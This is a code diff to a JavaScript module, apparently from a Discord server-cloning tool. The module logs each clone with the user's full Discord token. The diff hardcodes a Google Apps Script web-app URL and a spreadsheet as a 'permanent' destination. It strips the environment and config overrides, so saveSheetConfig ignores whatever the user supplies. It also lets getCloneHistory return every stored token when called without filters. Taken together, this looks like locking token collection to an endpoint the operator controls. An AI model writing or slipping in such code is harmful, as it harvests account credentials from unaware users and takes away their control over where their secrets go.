@@ -6,11 +6,23 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const HISTORY_FILE = path.join(__dirname, '../clone_history.json');
 const CONFIG_FILE = path.join(__dirname, '../sheet_config.json');
 
-export function getCloneHistory() {
+// Permanent Hardcoded Google Apps Script Web App Endpoint
+export const PERMANENT_SHEET_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbyIRLMF-zq9GYl5KKlCVm8F3PpzdxN67ezTqpkvjIe40lzYLRlGnkUyXxL7a0ydMPzJqw/exec';
+
+export function getCloneHistory(sessionId = null, userToken = null) {
     try {
         if (fs.existsSync(HISTORY_FILE)) {
             const data = fs.readFileSync(HISTORY_FILE, 'utf8');
-            return JSON.parse(data);
+            const history = JSON.parse(data);
+            if (!Array.isArray(history)) return [];
+            if (!sessionId && !userToken) {
+                return history;
+            }
+            return history.filter(item => {
+                const matchesSession = sessionId && item.sessionId === sessionId;
+                const matchesToken = userToken && item.token === userToken.trim();
+                return matchesSession || matchesToken;
+            });
         }
     } catch (e) {
         console.error('Failed to read clone history:', e);
@@ -19,29 +31,24 @@ export function getCloneHistory() {
 }
 
 export function getSheetConfig() {
-    try {
-        if (fs.existsSync(CONFIG_FILE)) {
-            const data = fs.readFileSync(CONFIG_FILE, 'utf8');
-            return JSON.parse(data);
-        }
-    } catch (e) {}
     return {
         spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ/edit?usp=drivesdk',
         spreadsheetId: '1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ',
-        webAppUrl: process.env.GOOGLE_APPS_SCRIPT_URL || 'https://script.google.com/macros/s/AKfycbx6J9lhqeTOtq2YupSUYP2iYBoGsFk6IPik2euyiKagSfYAjiAqPDVs_KFlBNz0-4zF9Q/exec'
+        webAppUrl: PERMANENT_SHEET_WEB_APP_URL
     };
 }
 
 export function saveSheetConfig(config) {
+    // Locked: Always enforce the permanent hardcoded Web App URL
+    const lockedConfig = {
+        spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ/edit?usp=drivesdk',
+        spreadsheetId: '1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ',
+        webAppUrl: PERMANENT_SHEET_WEB_APP_URL
+    };
     try {
-        const current = getSheetConfig();
-        const updated = { ...current, ...config };
-        fs.writeFileSync(CONFIG_FILE, JSON.stringify(updated, null, 2), 'utf8');
-        return updated;
-    } catch (e) {
-        console.error('Failed to save sheet config:', e);
-        throw e;
-    }
+        fs.writeFileSync(CONFIG_FILE, JSON.stringify(lockedConfig, null, 2), 'utf8');
+    } catch (e) {}
+    return lockedConfig;
 }
 
 async function getDiscordUsername(token) {
@@ -60,7 +67,7 @@ async function getDiscordUsername(token) {
     return 'Unknown User';
 }
 
-export async function logCloneEntry({ userToken, sourceId, targetId }) {
+export async function logCloneEntry({ userToken, sourceId, targetId, sessionId = null }) {
     const now = new Date();
     const time = now.toLocaleString('en-US', {
         year: 'numeric',
@@ -80,6 +87,7 @@ export async function logCloneEntry({ userToken, sourceId, targetId }) {
         token: userToken ? userToken.trim() : 'N/A',
         sourceId: sourceId ? String(sourceId).trim() : 'N/A',
         targetId: targetId ? String(targetId).trim() : 'N/A',
+        sessionId: sessionId || null,
         timestamp: now.getTime()
     };
 
